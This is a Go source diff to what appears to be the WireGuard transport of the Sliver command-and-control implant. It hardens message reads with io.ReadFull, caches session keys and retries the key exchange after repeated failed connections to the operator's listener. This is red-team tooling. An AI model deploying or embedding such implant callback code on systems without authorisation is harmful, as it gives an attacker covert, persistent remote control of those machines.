@@ -26,9 +26,11 @@ import (
 	"bufio"
 	"bytes"
 	"encoding/binary"
+	"errors"
 	"fmt"
 	"io"
 	"net"
+	"net/netip"
 	"strconv"
 	"strings"
 	"time"
@@ -47,7 +49,6 @@ import (
 )
 
 var (
-	readBufSize = 16 * 1024    // 16kb
 	serverTunIP = "100.64.0.1" // Don't let user configure this for now
 	tunnelNet   *netstack.Net
 	tunAddress  string
@@ -58,7 +59,11 @@ var (
 	wgKeyExchangePort = getWgKeyExchangePort()
 	wgTcpCommsPort    = getWgTcpCommsPort()
 
+	wgSessPrivKey string
+	wgSessPubKey  string
+
 	PingInterval = 2 * time.Minute
+	failedConn   = 0
 )
 
 // GetTNet - Get the netstack Net object
@@ -110,8 +115,8 @@ func ReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 	if len(dataLengthBuf) == 0 || connection == nil {
 		panic("[[GenerateCanary]]")
 	}
-	_, err := connection.Read(dataLengthBuf)
-	if err != nil {
+	n, err := io.ReadFull(connection, dataLengthBuf)
+	if err != nil || n != 4 {
 		// {{if .Config.Debug}}
 		log.Printf("Socket error (read msg-length): %v\n", err)
 		// {{end}}
@@ -119,23 +124,22 @@ func ReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 	}
 	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
 
-	// Read the length of the data
-	readBuf := make([]byte, readBufSize)
-	dataBuf := make([]byte, 0)
-	totalRead := 0
-	for {
-		n, err := connection.Read(readBuf)
-		dataBuf = append(dataBuf, readBuf[:n]...)
-		totalRead += n
-		if totalRead == dataLength {
-			break
-		}
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("Read error: %s\n", err)
-			// {{end}}
-			break
-		}
+	if dataLength <= 0 {
+		// {{if .Config.Debug}}
+		log.Printf("[pivot] read error: %s\n", err)
+		// {{end}}
+		return nil, errors.New("[wireguard] zero data length")
+	}
+
+	dataBuf := make([]byte, dataLength)
+
+	n, err = io.ReadFull(connection, dataBuf)
+
+	if err != nil || n != dataLength {
+		// {{if .Config.Debug}}
+		log.Printf("Read error: %s\n", err)
+		// {{end}}
+		return nil, err
 	}
 
 	// Unmarshal the protobuf envelope
@@ -151,12 +155,11 @@ func ReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 	return envelope, nil
 }
 
-// WGConnect - Get a wg connection or die trying
-func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
-
+// getSessKeys - Connect to the wireguard server and retrieve session specific keys and IP
+func getSessKeys(address string, port uint16) error {
 	_, dev, tNet, err := bringUpWGInterface(address, port, wgImplantPrivKey, wgServerPubKey, wgPeerTunIP)
 	if err != nil {
-		return nil, nil, err
+		return err
 	}
 
 	dev.Up()
@@ -170,10 +173,10 @@ func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 		// {{if .Config.Debug}}
 		log.Printf("Unable to connect to wg key exchange listener: %v", err)
 		// {{end}}
-		return nil, nil, err
+		return err
 	}
 
-	privKey, pubKey, newIP := doKeyExchange(keyExchangeConnection)
+	wgSessPrivKey, wgSessPubKey, tunAddress = doKeyExchange(keyExchangeConnection)
 
 	// {{if .Config.Debug}}
 	log.Printf("Signaling wg device to go down")
@@ -186,12 +189,21 @@ func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 		// {{if .Config.Debug}}
 		log.Printf("Failed to close device.Device: %s", err)
 		// {{end}}
-		return nil, nil, err
+		return err
+	}
+	return nil
+}
+
+// WGConnect - Get a wg connection or die trying
+func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
+	if wgSessPrivKey == "" || failedConn > 2 {
+		getSessKeys(address, port)
 	}
 
-	// Bring up second wireguard connection using retrieved keys and IP
-	_, dev, tNet, err = bringUpWGInterface(address, port, privKey, pubKey, newIP)
+	// Bring up actual wireguard connection using retrieved keys and IP
+	_, dev, tNet, err := bringUpWGInterface(address, port, wgSessPrivKey, wgSessPubKey, tunAddress)
 	if err != nil {
+		failedConn++
 		return nil, nil, err
 	}
 
@@ -200,14 +212,15 @@ func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 		// {{if .Config.Debug}}
 		log.Printf("Unable to connect to sliver listener: %v", err)
 		// {{end}}
+		failedConn++
 		return nil, nil, err
 	}
 
 	// {{if .Config.Debug}}
 	log.Printf("Successfully connected to sliver listener")
 	// {{end}}
+	failedConn = 0
 	tunnelNet = tNet
-	tunAddress = newIP
 	return connection, dev, nil
 }
 
@@ -215,8 +228,8 @@ func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 // then creates a Wireguard device/interface and applies configuration
 func bringUpWGInterface(address string, port uint16, implantPrivKey string, serverPubKey string, netstackTunIP string) (tun.Device, *device.Device, *netstack.Net, error) {
 	tun, tNet, err := netstack.CreateNetTUN(
-		[]net.IP{net.ParseIP(netstackTunIP)},
-		[]net.IP{net.ParseIP("127.0.0.1")}, // We don't use DNS in the WG implant. Yet.
+		[]netip.Addr{netip.MustParseAddr(netstackTunIP)},
+		[]netip.Addr{netip.MustParseAddr("127.0.0.1")}, // We don't use DNS in the WG implant. Yet.
 		1420)
 	if err != nil {
 		// {{if .Config.Debug}}
